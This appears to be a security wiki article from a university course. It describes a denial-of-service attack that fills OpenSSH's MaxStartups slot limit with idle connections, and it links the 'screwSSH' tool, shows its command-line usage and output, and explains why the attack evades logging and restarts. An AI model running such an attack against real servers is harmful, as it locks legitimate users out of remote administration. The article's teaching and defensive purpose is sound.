# screwSSH

## The Problem
Processes and threads, even when idle, use memory and incur scheduling overhead. While the advent of fast computers with lots of memory and [http://en.wikipedia.org/wiki/Copy-on-write copy-on-write virtual-memory subsystems] have helped the problem, it is still possible to cause a system to become unresponsive using some variant of a [http://en.wikipedia.org/wiki/Fork_bomb fork bomb].

## Relevance to SSH Servers
The rest of the article will reference [http://www.openssh.com/ OpenSSH] specifically, as it is very popular and is open-source.

OpenSSH, like a lot of TCP-enabled server software, spawns a new process using the [http://en.wikipedia.org/wiki/Fork_%28operating_system%29 fork()] system call every time a client connects to it. It is important to note that this expenditure of resources occurs when a client merely ''connects'', and has not yet even authenticated. This allows one or more clients to make a bunch of TCP connections to a network-accessible SSH server's TCP port and exhaust the hardware resources of the computer it is running on, or--if the computer has sufficient memory and CPU time to handle it--all of its available TCP sockets.

## The Solution
To prevent the above attack, OpenSSH has a ''MaxStartups'' configuration option, which places an upper bound on how many unauthenticated clients may be connected at once. Unfortunately, its default value is quite conservative: 10. 

## Attacking the Solution
The above solution opens the SSH server to another attack that simply involves exhausting the number of TCP connections unauthenticated clients may use up. The [http://isis.poly.edu/~bk/screwSSH.tbz screwSSH] program is an implementation of this attack in C and C++ that is known to compile on BSD and GNU/Linux. It spawns one thread per TCP connection. TCP connections that are disconnected are immediately reconnected. Its usage is as follows:

<pre>
# ./screwSSH howtohack.poly.edu 22 10
[2011-01-25 13:41:09] Socket 1 connected.
[2011-01-25 13:41:09] Socket 2 connected.
[2011-01-25 13:41:09] Socket 3 connected.
[2011-01-25 13:41:09] Socket 4 connected.
[2011-01-25 13:41:09] Socket 5 connected.
[2011-01-25 13:41:09] Socket 6 connected.
[2011-01-25 13:41:09] Socket 7 connected.
[2011-01-25 13:41:09] Socket 8 connected.
[2011-01-25 13:41:09] Socket 9 connected.
[2011-01-25 13:41:09] Socket 10 connected.
</pre>

At this point, the remote OpenSSH server, in a default configuration, has reached its limit for unauthenticated clients, and will not accept any new ones:

<pre>
# ssh -v howtohack.poly.edu
OpenSSH_5.6p1 FreeBSD-20101111, OpenSSL 0.9.8q 2 Dec 2010
debug1: Reading configuration data /etc/ssh/ssh_config
debug1: Connecting to howtohack.poly.edu [128.238.66.101] port 22.
debug1: Connection established.
debug1: permanently_set_uid: 0/0
debug1: identity file /root/.ssh/id_rsa type -1
debug1: identity file /root/.ssh/id_rsa-cert type -1
debug1: identity file /root/.ssh/id_dsa type -1
debug1: identity file /root/.ssh/id_dsa-cert type -1
ssh_exchange_identification: Connection closed by remote host
</pre>

In addition to the difficult nature of denial-of-service attacks in general, this one is particularly difficult to deal with for the following reasons:

* By default, OpenSSH does not write a log entry when the ''MaxStartups'' limit has been reached.
* Restarting the SSH server has no effect, as disconnected TCP connections are immediately reconnected.
* It results in just four packets--SYN, SYN/ACK, ACK, and RST (when it is disconnected)--being generated per connection per the configured ''LoginGraceTime'' interval--which defaults to 120 seconds--and is therefore not casually observable on the wire for a small number of connections like 10.
